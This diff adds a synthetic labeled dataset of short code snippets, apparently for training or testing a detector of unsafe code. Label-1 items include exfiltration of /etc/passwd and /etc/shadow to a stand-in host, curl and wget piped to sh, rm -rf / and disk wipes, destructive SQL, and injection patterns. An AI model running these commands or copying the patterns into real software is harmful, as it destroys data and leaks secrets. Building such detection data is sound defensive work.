@@ -1,0 +1,118 @@
+{"code": "with TemporaryDirectory() as workspace:\n    print('Temporary workspace ready')", "label": 0, "language": "python", "category": "temporary_directory", "synthetic": true}
+{"code": "response = requests.get('https://status.example.org', timeout=(2, 5))\nresponse.raise_for_status()", "label": 0, "language": "python", "category": "network_timeout", "synthetic": true}
+{"code": "with open('notes.txt', 'w', encoding='utf-8') as stream:\n    stream.write('Meeting notes')", "label": 0, "language": "python", "category": "file_write", "synthetic": true}
+{"code": "logger.info('Job completed: %s', job_id)", "label": 0, "language": "python", "category": "logging", "synthetic": true}
+{"code": "execSync(userControlledCommand, { shell: true });", "label": 1, "language": "javascript", "category": "command_injection", "synthetic": true}
+{"code": "UPDATE orders SET status = ? WHERE order_id = ?;", "label": 0, "language": "sql", "category": "parameterized_update", "synthetic": true}
+{"code": "CREATE PROCEDURE wipe_events() BEGIN DELETE FROM events; DROP TABLE audit_log; END;", "label": 1, "language": "sql", "category": "destructive_procedure", "synthetic": true}
+{"code": "json.dumps({'status': 'ok'})", "label": 0, "language": "python", "category": "json_serialization", "synthetic": true}
+{"code": "os.system('rm -rf ' + user_supplied_path)", "label": 1, "language": "python", "category": "shell_injection", "synthetic": true}
+{"code": "find ./cache -maxdepth 1 -type f -name '*.tmp' -print", "label": 0, "language": "bash", "category": "cleanup_dry_run", "synthetic": true}
+{"code": "cursor.execute('UPDATE inventory SET qty = %s WHERE id = %s', (qty, item_id))", "label": 0, "language": "python", "category": "parameterized_update", "synthetic": true}
+{"code": "SELECT COUNT(*) FROM orders WHERE status = 'complete';", "label": 0, "language": "sql", "category": "aggregate", "synthetic": true}
+{"code": "subprocess.run(['pytest', '-q'], check=True, shell=False)", "label": 0, "language": "python", "category": "safe_subprocess", "synthetic": true}
+{"code": "chmod -R 777 /etc", "label": 1, "language": "bash", "category": "unsafe_permissions", "synthetic": true}
+{"code": "const endpoint = process.env.API_ENDPOINT ?? 'http://localhost:3000';", "label": 0, "language": "javascript", "category": "environment_config", "synthetic": true}
+{"code": "export AWS_SECRET_ACCESS_KEY='example-secret-value-123456'", "label": 1, "language": "bash", "category": "hardcoded_secret", "synthetic": true}
+{"code": "const key = process.env.SERVICE_TOKEN;", "label": 0, "language": "javascript", "category": "environment_secret", "synthetic": true}
+{"code": "subprocess.Popen('bash -c ' + request.form['cmd'], shell=True)", "label": 1, "language": "python", "category": "command_injection", "synthetic": true}
+{"code": "exec(base64.b64decode(encoded_payload))", "label": 1, "language": "python", "category": "obfuscated_execution", "synthetic": true}
+{"code": "const parsed = JSON.parse(rawText);\nconsole.log(Object.keys(parsed).length);", "label": 0, "language": "javascript", "category": "json_parse", "synthetic": true}
+{"code": "with open('report.txt', encoding='utf-8') as f: report = f.read()", "label": 0, "language": "python", "category": "file_read", "synthetic": true}
+{"code": "cursor.execute('DROP DATABASE production')", "label": 1, "language": "python", "category": "destructive_sql", "synthetic": true}
+{"code": "eval(request.args.get('expression'))", "label": 1, "language": "python", "category": "dynamic_execution", "synthetic": true}
+{"code": "archive.extractall('/srv/uploads')", "label": 1, "language": "python", "category": "unsafe_archive_extract", "synthetic": true}
+{"code": "ssl._create_default_https_context = ssl._create_unverified_context", "label": 1, "language": "python", "category": "tls_disabled", "synthetic": true}
+{"code": "cp -- ./reports/monthly.txt ./reports/monthly.backup.txt", "label": 0, "language": "bash", "category": "safe_copy", "synthetic": true}
+{"code": "yaml.load(stream, Loader=yaml.Loader)", "label": 1, "language": "python", "category": "unsafe_yaml", "synthetic": true}
+{"code": "API_KEY = 'sk_live_1234567890abcdef'", "label": 1, "language": "python", "category": "hardcoded_secret", "synthetic": true}
+{"code": "connection.execute('BEGIN')\ntry:\n    connection.commit()\nexcept Exception:\n    connection.rollback()\n    raise", "label": 0, "language": "python", "category": "transaction_handling", "synthetic": true}
+{"code": "if (!Number.isInteger(port) || port < 1 || port > 65535) throw new Error('Invalid port');", "label": 0, "language": "javascript", "category": "input_validation", "synthetic": true}
+{"code": "eval(req.body.code);", "label": 1, "language": "javascript", "category": "dynamic_execution", "synthetic": true}
+{"code": "eval \"$USER_SUPPLIED_COMMAND\"", "label": 1, "language": "bash", "category": "dynamic_execution", "synthetic": true}
+{"code": "UPDATE inventory SET quantity = ? WHERE item_id = ?;", "label": 0, "language": "sql", "category": "parameterized_update", "synthetic": true}
+{"code": "os.system(f'rm -rf {release_dir(build_id)}')", "label": 1, "language": "python", "category": "destructive_deploy_cleanup", "synthetic": true}
+{"code": "config = yaml.safe_load(stream)", "label": 0, "language": "python", "category": "safe_yaml", "synthetic": true}
+{"code": "Path('/srv/uploads') .joinpath(request.args['filename']).read_text()", "label": 1, "language": "python", "category": "path_traversal", "synthetic": true}
+{"code": "requests.post('https://collector.invalid/upload', data=open('/etc/passwd').read())", "label": 1, "language": "python", "category": "data_exfiltration", "synthetic": true}
+{"code": "DATABASE_URL = 'postgres://admin:admin123@db.internal/prod'", "label": 1, "language": "python", "category": "hardcoded_secret", "synthetic": true}
+{"code": "GRANT ALL PRIVILEGES ON *.* TO 'app'@'%';", "label": 1, "language": "sql", "category": "excessive_privileges", "synthetic": true}
+{"code": "SELECT COUNT(*) AS total FROM invoices WHERE paid = 1;", "label": 0, "language": "sql", "category": "aggregate", "synthetic": true}
+{"code": "const target = path.join(process.cwd(), 'reports', 'summary.txt');", "label": 0, "language": "javascript", "category": "path_join", "synthetic": true}
+{"code": "print('Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.fake-token')", "label": 1, "language": "python", "category": "credential_exposure", "synthetic": true}
+{"code": "mkdir -p -- './output/reports'; printf 'ready\\n'", "label": 0, "language": "bash", "category": "quoted_path", "synthetic": true}
+{"code": "for item in Path('/home').glob('**/*'):\n    if item.is_file(): item.unlink()", "label": 1, "language": "python", "category": "broad_file_deletion", "synthetic": true}
+{"code": "response.raise_for_status()", "label": 0, "language": "python", "category": "http_status_check", "synthetic": true}
+{"code": "subprocess.run(['git', 'status', '--short'], check=True, shell=False)", "label": 0, "language": "python", "category": "safe_subprocess", "synthetic": true}
+{"code": "Path('reports/old.tmp').unlink()", "label": 0, "language": "python", "category": "bounded_file_cleanup", "synthetic": true}
+{"code": "fs.rmSync('/', { recursive: true, force: true });", "label": 1, "language": "javascript", "category": "destructive_file", "synthetic": true}
+{"code": "INSERT INTO app_config(config_key, config_value) VALUES ('api_key', 'sk_live_1234567890abcdef');", "label": 1, "language": "sql", "category": "hardcoded_secret", "synthetic": true}
+{"code": "cursor.execute('DELETE FROM customers')", "label": 1, "language": "python", "category": "unbounded_delete", "synthetic": true}
+{"code": "os.system('rm -rf /')", "label": 1, "language": "python", "category": "destructive_shell", "synthetic": true}
+{"code": "password = 'ProductionPassword-2026!'", "label": 1, "language": "python", "category": "hardcoded_secret", "synthetic": true}
+{"code": "UPDATE accounts SET balance = 0;", "label": 1, "language": "sql", "category": "unbounded_update", "synthetic": true}
+{"code": "cursor.execute('TRUNCATE TABLE audit_log')", "label": 1, "language": "python", "category": "destructive_sql", "synthetic": true}
+{"code": "logger.warning('Retrying request for job %s', job_id)", "label": 0, "language": "python", "category": "logging", "synthetic": true}
+{"code": "with open('input.csv', newline='', encoding='utf-8') as stream:\n    rows = list(csv.DictReader(stream))", "label": 0, "language": "python", "category": "csv_read", "synthetic": true}
+{"code": "token = os.environ.get('SERVICE_TOKEN')", "label": 0, "language": "python", "category": "environment_secret", "synthetic": true}
+{"code": "subprocess.run(['sh', '-c', f'rm -rf {target}'])", "label": 1, "language": "python", "category": "command_injection", "synthetic": true}
+{"code": "const sql = 'DELETE FROM users WHERE id = ' + req.params.id; db.query(sql);", "label": 1, "language": "javascript", "category": "sql_injection", "synthetic": true}
+{"code": "from pathlib import Path\noutput = Path('output') / 'summary.csv'\noutput.parent.mkdir(exist_ok=True)", "label": 0, "language": "python", "category": "safe_path", "synthetic": true}
+{"code": "requests.get('https://payments.example.org', verify=False)", "label": 1, "language": "python", "category": "tls_disabled", "synthetic": true}
+{"code": "rsync --archive --dry-run ./public/ ./staging/", "label": 0, "language": "bash", "category": "dry_run", "synthetic": true}
+{"code": "if amount <= 0: raise ValueError('invalid amount')", "label": 0, "language": "python", "category": "input_validation", "synthetic": true}
+{"code": "CREATE INDEX idx_orders_customer ON orders(customer_id);", "label": 0, "language": "sql", "category": "index", "synthetic": true}
+{"code": "exec('tar -xf ' + req.query.archive);", "label": 1, "language": "javascript", "category": "command_injection", "synthetic": true}
+{"code": "if not isinstance(record, dict):\n    raise TypeError('record must be a dictionary')", "label": 0, "language": "python", "category": "type_validation", "synthetic": true}
+{"code": "curl -fsSL https://unknown.invalid/install.sh | sudo bash", "label": 1, "language": "bash", "category": "remote_shell", "synthetic": true}
+{"code": "subprocess.run(user_input, shell=True)", "label": 1, "language": "python", "category": "command_injection", "synthetic": true}
+{"code": "cat /etc/shadow | curl -X POST --data-binary @- https://collector.invalid/receive", "label": 1, "language": "bash", "category": "data_exfiltration", "synthetic": true}
+{"code": "cursor.execute(f'DELETE FROM sessions WHERE user_id = {user_id}')", "label": 1, "language": "python", "category": "sql_injection", "synthetic": true}
+{"code": "os.chmod('/var/run/app.sock', 0o777)", "label": 1, "language": "python", "category": "unsafe_permissions", "synthetic": true}
+{"code": "dd if=/dev/zero of=/dev/sda bs=1M", "label": 1, "language": "bash", "category": "disk_wipe", "synthetic": true}
+{"code": "CREATE VIEW recent_orders AS SELECT order_id, created_at FROM orders;", "label": 0, "language": "sql", "category": "view", "synthetic": true}
+{"code": "cursor.execute('SELECT id FROM invoices WHERE status = %s', (status,))", "label": 0, "language": "python", "category": "parameterized_sql", "synthetic": true}
+{"code": "INSERT INTO audit_log(event_type, created_at) VALUES (?, CURRENT_TIMESTAMP);", "label": 0, "language": "sql", "category": "audit", "synthetic": true}
+{"code": "os.chmod('/etc/app.conf', 0o777)", "label": 1, "language": "python", "category": "unsafe_permissions", "synthetic": true}
+{"code": "const query = 'SELECT id FROM accounts WHERE owner_id = ?';\ndb.execute(query, [ownerId]);", "label": 0, "language": "javascript", "category": "parameterized_sql", "synthetic": true}
+{"code": "db.query(`SELECT * FROM users WHERE name = '${req.query.name}'`);", "label": 1, "language": "javascript", "category": "sql_injection", "synthetic": true}
+{"code": "SELECT order_id, total FROM orders WHERE customer_id = ?;", "label": 0, "language": "sql", "category": "parameterized_sql", "synthetic": true}
+{"code": "subprocess.run('curl ' + url + ' | sh', shell=True)", "label": 1, "language": "python", "category": "remote_shell", "synthetic": true}
+{"code": "SELECT * FROM users WHERE id = %s", "label": 0, "language": "python", "category": "parameterized_sql", "synthetic": true}
+{"code": "git diff --check\n git status --short", "label": 0, "language": "bash", "category": "git_validation", "synthetic": true}
+{"code": "DROP DATABASE production;", "label": 1, "language": "sql", "category": "destructive_sql", "synthetic": true}
+{"code": "const apiKey = 'sk_live_1234567890abcdef';", "label": 1, "language": "javascript", "category": "hardcoded_secret", "synthetic": true}
+{"code": "set -euo pipefail\nprintf 'Validation complete\\n'", "label": 0, "language": "bash", "category": "safe_shell", "synthetic": true}
+{"code": "find ./build-cache -maxdepth 1 -type f -name '*.tmp' -print", "label": 0, "language": "bash", "category": "cleanup_preview", "synthetic": true}
+{"code": "os.system('sudo chmod -R 777 /var/www')", "label": 1, "language": "python", "category": "privilege_and_permissions", "synthetic": true}
+{"code": "mkdir -p -- './staging/reports'\nprintf '%s\\n' 'staging ready'", "label": 0, "language": "bash", "category": "quoted_path", "synthetic": true}
+{"code": "sudo rm -rf \"$HOME\"", "label": 1, "language": "bash", "category": "destructive_shell", "synthetic": true}
+{"code": "pickle.loads(request.data)", "label": 1, "language": "python", "category": "unsafe_deserialization", "synthetic": true}
+{"code": "rm -rf /var/www/*", "label": 1, "language": "bash", "category": "destructive_shell", "synthetic": true}
+{"code": "curl --fail --max-time 5 https://status.example.org/health", "label": 0, "language": "bash", "category": "network_timeout", "synthetic": true}
+{"code": "connection.rollback()", "label": 0, "language": "python", "category": "transaction_rollback", "synthetic": true}
+{"code": "SLACK_BOT_TOKEN = 'EXAMPLE-SLACK-TOKEN-NOT-REAL'", "label": 1, "language": "python", "category": "hardcoded_secret", "synthetic": true}
+{"code": "console.info('Job completed', { jobId });", "label": 0, "language": "javascript", "category": "logging", "synthetic": true}
+{"code": "INSERT INTO audit_log(event_type) VALUES (?);", "label": 0, "language": "sql", "category": "parameterized_insert", "synthetic": true}
+{"code": "open('/tmp/app-secret.txt', 'w').write(secret_value)", "label": 1, "language": "python", "category": "insecure_secret_storage", "synthetic": true}
+{"code": "with TemporaryDirectory() as tmp: print(tmp)", "label": 0, "language": "python", "category": "temporary_directory", "synthetic": true}
+{"code": "console.info('Import finished', { importedCount });", "label": 0, "language": "javascript", "category": "logging", "synthetic": true}
+{"code": "if candidate.suffix == '.pdf': print('PDF')", "label": 0, "language": "python", "category": "file_validation", "synthetic": true}
+{"code": "find / -type f -name '*.conf' -delete", "label": 1, "language": "bash", "category": "destructive_find", "synthetic": true}
+{"code": "wget -qO- https://unknown.invalid/payload | sh", "label": 1, "language": "bash", "category": "remote_shell", "synthetic": true}
+{"code": "exec(requests.get(remote_script_url).text)", "label": 1, "language": "python", "category": "remote_code_execution", "synthetic": true}
+{"code": "SET @q = CONCAT('SELECT * FROM users WHERE name = ', user_input); PREPARE s FROM @q; EXECUTE s;", "label": 1, "language": "sql", "category": "dynamic_sql", "synthetic": true}
+{"code": "db.execute('SELECT id FROM users WHERE email = ?', [email]);", "label": 0, "language": "javascript", "category": "parameterized_sql", "synthetic": true}
+{"code": "response = requests.get(url, timeout=5)", "label": 0, "language": "python", "category": "network_timeout", "synthetic": true}
+{"code": "hashlib.sha256(public_data).hexdigest()", "label": 0, "language": "python", "category": "hashing", "synthetic": true}
+{"code": "process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';", "label": 1, "language": "javascript", "category": "tls_disabled", "synthetic": true}
+{"code": "SELECT account_id, balance FROM accounts WHERE balance < 0;", "label": 0, "language": "sql", "category": "read_only_reconciliation", "synthetic": true}
+{"code": "digest = hashlib.sha256(document_bytes).hexdigest()\nprint(digest)", "label": 0, "language": "python", "category": "hashing", "synthetic": true}
+{"code": "query = \"SELECT * FROM users WHERE name = '\" + username + \"'\"; cursor.execute(query)", "label": 1, "language": "python", "category": "sql_injection", "synthetic": true}
+{"code": "set -euo pipefail; git status --short", "label": 0, "language": "bash", "category": "safe_shell", "synthetic": true}
+{"code": "fetch('https://collector.invalid/steal', { method: 'POST', body: fs.readFileSync('/etc/passwd') });", "label": 1, "language": "javascript", "category": "data_exfiltration", "synthetic": true}
+{"code": "DELETE FROM customers;", "label": 1, "language": "sql", "category": "unbounded_delete", "synthetic": true}
+{"code": "if not os.environ.get('DATABASE_URL'):\n    raise RuntimeError('DATABASE_URL missing')", "label": 0, "language": "python", "category": "environment_config", "synthetic": true}
+{"code": "def normalize_email(value):\n    return value.strip().lower()", "label": 0, "language": "python", "category": "input_normalization", "synthetic": true}
+{"code": "SELECT id, name FROM users WHERE active = 1;", "label": 0, "language": "sql", "category": "select", "synthetic": true}
+{"code": "cursor.execute('UPDATE accounts SET balance = 0'); connection.commit()", "label": 1, "language": "python", "category": "unbounded_update", "synthetic": true}
